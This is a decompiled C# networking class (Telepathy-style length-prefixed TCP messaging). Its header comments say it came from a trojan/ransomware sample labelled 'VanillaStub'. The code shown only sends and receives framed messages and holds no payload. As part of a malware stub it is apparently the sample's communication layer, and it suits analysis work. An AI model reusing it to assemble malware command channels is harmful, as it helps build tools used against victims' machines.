// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Telepathy.Common
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Threading;

namespace VanillaStub.Helpers.Telepathy
{
  public abstract class Common
  {
    public static int messageQueueSizeWarning = 100000;
    public int MaxMessageSize = int.MaxValue;
    public bool NoDelay = true;
    protected ConcurrentQueue<Message> receiveQueue = new ConcurrentQueue<Message>();
    public int SendTimeout = 5000;

    public int ReceiveQueueCount => this.receiveQueue.Count;

    public bool GetNextMessage(out Message message) => this.receiveQueue.TryDequeue(out message);

    protected static bool SendMessagesBlocking(NetworkStream stream, byte[][] messages)
    {
      try
      {
        int length = 0;
        for (int index = 0; index < messages.Length; ++index)
          length += 4 + messages[index].Length;
        byte[] numArray = new byte[length];
        int destinationIndex = 0;
        for (int index = 0; index < messages.Length; ++index)
        {
          byte[] bytesBigEndian = Utils.IntToBytesBigEndian(messages[index].Length);
          Array.Copy((Array) bytesBigEndian, 0, (Array) numArray, destinationIndex, bytesBigEndian.Length);
          Array.Copy((Array) messages[index], 0, (Array) numArray, destinationIndex + bytesBigEndian.Length, messages[index].Length);
          destinationIndex += bytesBigEndian.Length + messages[index].Length;
        }
        stream.Write(numArray, 0, numArray.Length);
        return true;
      }
      catch (Exception ex)
      {
        Logger.Log("Send: stream.Write exception: " + (object) ex);
        return false;
      }
    }

    protected static bool ReadMessageBlocking(
      NetworkStream stream,
      int MaxMessageSize,
      out byte[] content)
    {
      content = (byte[]) null;
      byte[] numArray = new byte[4];
      if (!stream.ReadExactly(numArray, 4))
        return false;
      int intBigEndian = Utils.BytesToIntBigEndian(numArray);
      if (intBigEndian <= MaxMessageSize)
      {
        content = new byte[intBigEndian];
        return stream.ReadExactly(content, intBigEndian);
      }
      Logger.LogWarning("ReadMessageBlocking: possible allocation attack with a header of: " + (object) intBigEndian + " bytes.");
      return false;
    }

    protected static void ReceiveLoop(
      int connectionId,
      TcpClient client,
      ConcurrentQueue<Message> receiveQueue,
      int MaxMessageSize)
    {
      NetworkStream stream = client.GetStream();
      DateTime now = DateTime.Now;
      try
      {
        receiveQueue.Enqueue(new Message(connectionId, EventType.Connected, (byte[]) null));
        while (true)
        {
          byte[] content;
          if (Common.ReadMessageBlocking(stream, MaxMessageSize, out content))
          {
            receiveQueue.Enqueue(new Message(connectionId, EventType.Data, content));
            if (receiveQueue.Count > Common.messageQueueSizeWarning && (DateTime.Now - now).TotalSeconds > 10.0)
            {
              Logger.LogWarning("ReceiveLoop: messageQueue is getting big(" + (object) receiveQueue.Count + "), try calling GetNextMessage more often. You can call it more than once per frame!");
              now = DateTime.Now;
            }
          }
          else
            break;
        }
      }
      catch (Exception ex)
      {
        Logger.Log("ReceiveLoop: finished receive function for connectionId=" + (object) connectionId + " reason: " + (object) ex);
      }
      stream.Close();
      client.Close();
      receiveQueue.Enqueue(new Message(connectionId, EventType.Disconnected, (byte[]) null));
    }

    protected static void SendLoop(
      int connectionId,
      TcpClient client,
      SafeQueue<byte[]> sendQueue,
      ManualResetEvent sendPending)
    {
      NetworkStream stream = client.GetStream();
      try
      {
        while (client.Connected)
        {
          sendPending.Reset();
          byte[][] result;
          if (sendQueue.TryDequeueAll(out result) && !Common.SendMessagesBlocking(stream, result))
            break;
          sendPending.WaitOne();
        }
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (ThreadInterruptedException ex)
      {
      }
      catch (Exception ex)
      {
        Logger.Log("SendLoop Exception: connectionId=" + (object) connectionId + " reason: " + (object) ex);
      }
    }
  }
}
